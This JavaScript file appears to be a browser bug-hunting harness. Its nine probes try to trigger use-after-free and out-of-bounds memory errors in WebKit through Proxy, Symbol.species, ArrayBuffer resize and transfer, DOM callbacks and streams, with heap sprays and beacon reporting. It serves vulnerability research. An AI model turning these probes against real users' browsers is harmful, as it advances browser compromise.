// p212 — Novel logic bug probes (NOT known CVEs)
//
// Targets JavaScript/WebKit interaction bugs:
// A: Proxy length confusion on Array.from
// B: Symbol.species type confusion on Array methods
// C: Proxy valueOf/toPrimitive during internal conversions
// D: structuredClone with getter that modifies source
// E: Custom Element lifecycle callback DOM modification
// F: MutationObserver callback + layout tree corruption
// G: ReadableStream pipe abort during transfer
// H: Proxy iterator protocol confusion
//
// Beacon prefix: V212-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V212-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;

  // ── TEST A: Proxy length confusion on Array.from ──
  // Array.from reads .length, then accesses indices.
  // If .length getter shrinks the real array + GC pressure,
  // the engine might access freed backing store.
  tests.push({name: 'A-PROXY-LEN', run: function(done) {
    var readCount = 0;
    var realArr = [];
    for (var i = 0; i < 10000; i++) realArr.push(new ArrayBuffer(64));

    var handler = {
      get: function(target, prop) {
        if (prop === 'length') {
          readCount++;
          if (readCount === 2) {
            // Second length read — shrink and GC
            realArr.length = 0;
            target.length = 0;
            for (var g = 0; g < 5000; g++) new ArrayBuffer(64);
            B('A-SHRUNK');
            return 10000; // lie about length
          }
        }
        if (typeof prop === 'string' && !isNaN(prop)) {
          var idx = parseInt(prop);
          if (idx >= target.length) {
            return undefined; // OOB read
          }
        }
        return Reflect.get(target, prop);
      }
    };

    try {
      var proxy = new Proxy(realArr, handler);
      var result = Array.from(proxy);
      B('A-RESULT-' + result.length);
      B('A-READS-' + readCount);
    } catch (e) {
      B('A-ERR-' + e.name + '-' + e.message.substring(0, 40));
    }
    done();
  }});

  // ── TEST B: Symbol.species type confusion ──
  // Array methods use @@species to create result arrays.
  // If species returns a non-array constructor → type confusion.
  tests.push({name: 'B-SPECIES', run: function(done) {
    try {
      var evilCalled = 0;
      function EvilCtor(len) {
        evilCalled++;
        // Return an object that intercepts index writes
        var backing = {};
        return new Proxy(backing, {
          set: function(t, p, v) {
            if (p === '0' && evilCalled === 1) {
              B('B-WRITE-0-' + typeof v);
              // During first write, trigger mass allocation
              for (var g = 0; g < 3000; g++) new ArrayBuffer(128);
            }
            t[p] = v;
            return true;
          },
          get: function(t, p) {
            return t[p];
          }
        });
      }

      var arr = [1, 2, 3, 4, 5];
      arr.constructor = {};
      arr.constructor[Symbol.species] = EvilCtor;

      var mapped = arr.map(function(x) { return x * 2; });
      B('B-MAPPED-' + (mapped ? 'OK' : 'NULL'));
      B('B-EVIL-' + evilCalled);

      // Also try filter
      evilCalled = 0;
      var arr2 = [1, 2, 3, 4, 5, 6, 7, 8];
      arr2.constructor = {};
      arr2.constructor[Symbol.species] = EvilCtor;
      var filtered = arr2.filter(function(x) { return x > 3; });
      B('B-FILTERED-' + (filtered ? 'OK' : 'NULL'));

      // Try slice
      evilCalled = 0;
      var arr3 = new Array(1000);
      for (var i = 0; i < 1000; i++) arr3[i] = new ArrayBuffer(32);
      arr3.constructor = {};
      arr3.constructor[Symbol.species] = EvilCtor;
      var sliced = arr3.slice(0, 500);
      B('B-SLICED-' + (sliced ? 'OK' : 'NULL'));
    } catch (e) {
      B('B-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST C: Proxy valueOf during arithmetic ──
  // When objects are used in arithmetic, valueOf/toPrimitive is called.
  // If the callback modifies shared state...
  tests.push({name: 'C-VALUEOF', run: function(done) {
    try {
      var callCount = 0;
      var sharedBuf = new ArrayBuffer(1024);
      var sharedView = new Uint8Array(sharedBuf);
      for (var i = 0; i < 1024; i++) sharedView[i] = 0x41;

      var evil = {
        [Symbol.toPrimitive]: function(hint) {
          callCount++;
          if (callCount === 1) {
            // Transfer/neuter the shared buffer during conversion
            try {
              var transferred = sharedBuf.transfer();
              B('C-TRANSFERRED-' + transferred.byteLength);
              // Spray over the freed buffer
              for (var g = 0; g < 5000; g++) {
                var ab = new ArrayBuffer(1024);
                var v = new Uint8Array(ab);
                v[0] = 0xBB;
              }
            } catch (e) {
              B('C-TRANSFER-ERR-' + e.name);
              // Fallback: resize if ResizableArrayBuffer
              try {
                var rab = new ArrayBuffer(1024, {maxByteLength: 4096});
                var rv = new Uint8Array(rab);
                for (var j = 0; j < 1024; j++) rv[j] = 0x42;
                rab.resize(0);
                B('C-RESIZED-TO-0');
                for (var g2 = 0; g2 < 5000; g2++) new ArrayBuffer(64);
              } catch (e2) {
                B('C-RAB-ERR-' + e2.name);
              }
            }
          }
          return 42;
        }
      };

      // Use evil object in operations that call valueOf
      var r1 = evil + 1;
      B('C-ADD-' + r1);
      var r2 = evil * 2;
      B('C-MUL-' + r2);

      // Check if sharedView still works (should be detached)
      try {
        var val = sharedView[0];
        B('C-VIEW-' + val.toString(16));
      } catch (e) {
        B('C-VIEW-DETACHED-' + e.name);
      }
    } catch (e) {
      B('C-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST D: structuredClone with getter modifying source ──
  tests.push({name: 'D-CLONE', run: function(done) {
    try {
      var triggerCount = 0;
      var bigArrays = [];
      for (var i = 0; i < 100; i++) {
        bigArrays.push(new ArrayBuffer(4096));
      }

      var source = {
        a: 1,
        b: bigArrays,
        get c() {
          triggerCount++;
          if (triggerCount === 1) {
            B('D-GETTER-FIRED');
            // Modify source during clone
            source.a = undefined;
            source.b = null;
            bigArrays.length = 0;
            // GC pressure
            for (var g = 0; g < 10000; g++) new ArrayBuffer(256);
            B('D-MODIFIED');
          }
          return 'gotcha';
        }
      };

      var cloned = structuredClone(source);
      B('D-CLONED-A-' + cloned.a + '-C-' + cloned.c);

      // Check if the clone has stale references
      if (cloned.b) {
        B('D-B-LEN-' + cloned.b.length);
        for (var j = 0; j < cloned.b.length && j < 3; j++) {
          try {
            var sz = cloned.b[j].byteLength;
            B('D-B-' + j + '-' + sz);
          } catch (e) {
            B('D-B-ERR-' + j + '-' + e.name);
          }
        }
      } else {
        B('D-B-NULL');
      }
    } catch (e) {
      B('D-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST E: Custom Element lifecycle callback UAF ──
  // connectedCallback fires when element is inserted.
  // If we remove the element's parent during the callback...
  tests.push({name: 'E-CUSTOMEL', run: function(done) {
    try {
      var callbacks = 0;
      var container = document.createElement('div');
      document.body.appendChild(container);

      customElements.define('evil-elem-' + Date.now(), class extends HTMLElement {
        connectedCallback() {
          callbacks++;
          if (callbacks <= 3) B('E-CONNECTED-' + callbacks);

          if (callbacks === 1) {
            // Remove parent during connected callback
            var parent = this.parentElement;
            if (parent && parent.parentElement) {
              parent.parentElement.removeChild(parent);
              B('E-PARENT-REMOVED');
            }

            // Spray
            for (var g = 0; g < 2000; g++) new ArrayBuffer(64);

            // Try to access this element's properties
            try {
              var rect = this.getBoundingClientRect();
              B('E-RECT-' + rect.width);
            } catch (e) {
              B('E-RECT-ERR-' + e.name);
            }
          }
        }

        disconnectedCallback() {
          if (callbacks <= 5) B('E-DISCONNECTED');
          // During disconnect, re-insert into a new parent
          try {
            var newParent = document.createElement('div');
            document.body.appendChild(newParent);
            newParent.appendChild(this); // Re-insert triggers connectedCallback
          } catch (e) {
            // Expected — recursive insertion might fail
          }
        }
      });

      var tagName = 'evil-elem-' + (Date.now() - 1);
      // Use the most recently defined tag
      var elements = document.querySelectorAll('evil-elem-*');

      // Create wrapper with nested custom elements
      var wrapper = document.createElement('div');
      container.appendChild(wrapper);
      for (var i = 0; i < 20; i++) {
        var el = document.createElement(tagName);
        el.textContent = 'item-' + i;
        wrapper.appendChild(el);
      }

      B('E-TOTAL-' + callbacks);

      setTimeout(function() {
        B('E-FINAL-' + callbacks);
        done();
      }, 1000);
    } catch (e) {
      B('E-ERR-' + e.name);
    }
  }});

  // ── TEST F: MutationObserver + forced layout during callback ──
  tests.push({name: 'F-MO-LAYOUT', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'position:relative; width:400px;';
      document.body.appendChild(container);

      // Create complex DOM
      for (var i = 0; i < 50; i++) {
        var div = document.createElement('div');
        div.style.cssText = 'position:absolute; left:' + i + 'px; width:100px;';
        div.id = 'mo-' + i;
        div.innerHTML = '<span>text ' + i + '</span>';
        container.appendChild(div);
      }
      B('F-CREATED-50');

      var moFired = 0;
      var mo = new MutationObserver(function(mutations) {
        moFired++;
        if (moFired === 1) {
          B('F-MO-1-' + mutations.length + 'muts');

          // During MO callback: delete nodes referenced in mutations
          for (var m = 0; m < mutations.length; m++) {
            var target = mutations[m].target;
            if (target && target.parentElement) {
              target.parentElement.removeChild(target);
            }
          }
          B('F-DELETED-IN-MO');

          // Force layout on deleted nodes
          for (var j = 0; j < 50; j++) {
            var el = document.getElementById('mo-' + j);
            if (el) {
              try {
                var h = el.offsetHeight;
                el.style.width = (100 + j) + 'px';
                var h2 = el.offsetHeight;
              } catch (e) {}
            }
          }
          B('F-LAYOUT-FORCED');

          // Spray
          for (var g = 0; g < 5000; g++) new ArrayBuffer(96);
          B('F-SPRAYED');
        }
      });

      mo.observe(container, {childList: true, subtree: true, attributes: true});

      // Trigger mutations
      for (var k = 0; k < 25; k++) {
        var child = container.children[k];
        if (child) {
          child.style.width = (200 + k) + 'px';
          child.setAttribute('data-x', k);
        }
      }

      // Remove half
      var toRemove = [];
      for (var r = 0; r < container.children.length; r += 2) {
        toRemove.push(container.children[r]);
      }
      for (var r2 = 0; r2 < toRemove.length; r2++) {
        container.removeChild(toRemove[r2]);
      }
      B('F-MUTATED');

      setTimeout(function() {
        mo.disconnect();
        B('F-MO-TOTAL-' + moFired);
        container.remove();
        done();
      }, 2000);
    } catch (e) {
      B('F-ERR-' + e.name);
    }
  }});

  // ── TEST G: ReadableStream pipe abort ──
  tests.push({name: 'G-PIPE', run: function(done) {
    try {
      var chunkCount = 0;
      var abortCtrl = new AbortController();

      var readable = new ReadableStream({
        pull: function(controller) {
          chunkCount++;
          if (chunkCount <= 3) {
            controller.enqueue(new Uint8Array(1024).fill(chunkCount));
          }
          if (chunkCount === 2) {
            // Abort during pull
            B('G-ABORTING');
            abortCtrl.abort();
            // GC pressure
            for (var g = 0; g < 5000; g++) new ArrayBuffer(512);
            B('G-ABORTED-GC');
          }
          if (chunkCount > 5) controller.close();
        }
      });

      var writtenChunks = 0;
      var writable = new WritableStream({
        write: function(chunk) {
          writtenChunks++;
          B('G-WRITE-' + writtenChunks + '-' + chunk.byteLength);
        },
        abort: function(reason) {
          B('G-STREAM-ABORT');
          // Spray during abort
          for (var g = 0; g < 3000; g++) new ArrayBuffer(256);
        }
      });

      readable.pipeTo(writable, {signal: abortCtrl.signal}).then(function() {
        B('G-PIPE-DONE');
        done();
      }).catch(function(e) {
        B('G-PIPE-ERR-' + e.name);
        done();
      });

      setTimeout(function() { done(); }, 5000);
    } catch (e) {
      B('G-ERR-' + e.name);
    }
  }});

  // ── TEST H: Proxy iterator protocol confusion ──
  // Make an object iterable via Proxy, but the iterator
  // modifies the iterable during iteration.
  tests.push({name: 'H-ITER', run: function(done) {
    try {
      var backingData = [];
      for (var i = 0; i < 1000; i++) {
        backingData.push({idx: i, buf: new ArrayBuffer(64)});
      }

      var iterCount = 0;
      var iterable = new Proxy({}, {
        get: function(target, prop) {
          if (prop === Symbol.iterator) {
            return function() {
              var pos = 0;
              return {
                next: function() {
                  iterCount++;
                  if (iterCount === 500) {
                    // Mid-iteration: nuke the backing data
                    backingData.length = 0;
                    B('H-NUKED-500');
                    for (var g = 0; g < 5000; g++) new ArrayBuffer(64);
                  }
                  if (pos < 1000) {
                    var val = backingData[pos] ? backingData[pos].buf : null;
                    pos++;
                    return {value: val, done: false};
                  }
                  return {done: true};
                }
              };
            };
          }
          return undefined;
        }
      });

      // Use spread operator
      try {
        var spread = [...iterable];
        B('H-SPREAD-' + spread.length);
        // Check if any entries are corrupted
        var nullCount = 0;
        for (var j = 0; j < spread.length; j++) {
          if (spread[j] === null || spread[j] === undefined) nullCount++;
        }
        B('H-NULLS-' + nullCount);
      } catch (e) {
        B('H-SPREAD-ERR-' + e.name);
      }

      // Also try Array.from
      backingData = [];
      for (var k = 0; k < 1000; k++) {
        backingData.push({idx: k, buf: new ArrayBuffer(64)});
      }
      iterCount = 0;

      try {
        var fromArr = Array.from(iterable);
        B('H-FROM-' + fromArr.length);
      } catch (e) {
        B('H-FROM-ERR-' + e.name);
      }

      // Try for...of
      backingData = [];
      for (var m = 0; m < 500; m++) {
        backingData.push({idx: m, buf: new ArrayBuffer(128)});
      }
      iterCount = 0;

      try {
        var forOfCount = 0;
        for (var item of iterable) {
          forOfCount++;
        }
        B('H-FOROF-' + forOfCount);
      } catch (e) {
        B('H-FOROF-ERR-' + e.name);
      }
    } catch (e) {
      B('H-ERR-' + e.name);
    }
    done();
  }});

  // ── TEST I: ResizableArrayBuffer resize during TypedArray operation ──
  tests.push({name: 'I-RAB', run: function(done) {
    try {
      var rab = new ArrayBuffer(4096, {maxByteLength: 65536});
      var view = new Uint32Array(rab);
      B('I-CREATED-' + rab.byteLength);

      // Fill with pattern
      for (var i = 0; i < view.length; i++) view[i] = 0xDEADBEEF;

      // Evil comparator that resizes during sort
      var sortCount = 0;
      var u32view = new Uint32Array(rab);
      try {
        u32view.sort(function(a, b) {
          sortCount++;
          if (sortCount === 100) {
            // Resize to 0 during sort comparison
            try {
              rab.resize(0);
              B('I-RESIZED-0-DURING-SORT');
              // Spray
              for (var g = 0; g < 3000; g++) new ArrayBuffer(128);
            } catch (e) {
              B('I-RESIZE-ERR-' + e.name);
            }
          }
          return a - b;
        });
        B('I-SORT-DONE-' + sortCount);
      } catch (e) {
        B('I-SORT-ERR-' + e.name);
      }

      // Test 2: resize during forEach
      rab = new ArrayBuffer(4096, {maxByteLength: 65536});
      var view2 = new Uint8Array(rab);
      for (var j = 0; j < view2.length; j++) view2[j] = j & 0xFF;

      var forEachCount = 0;
      try {
        view2.forEach(function(val, idx) {
          forEachCount++;
          if (idx === 100) {
            rab.resize(64); // Shrink while iterating
            B('I-SHRUNK-DURING-FOREACH');
          }
        });
        B('I-FOREACH-' + forEachCount);
      } catch (e) {
        B('I-FOREACH-ERR-' + e.name);
      }

      // Test 3: resize during DataView read
      rab = new ArrayBuffer(4096, {maxByteLength: 65536});
      var dv = new DataView(rab);
      var evilOffset = {
        valueOf: function() {
          rab.resize(0);
          B('I-RESIZED-IN-VALUEOF');
          return 2000; // past the new length
        }
      };
      try {
        var val = dv.getUint32(evilOffset);
        B('I-DV-READ-' + val);
      } catch (e) {
        B('I-DV-ERR-' + e.name);
      }
    } catch (e) {
      B('I-ERR-' + e.name);
    }
    done();
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 15000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
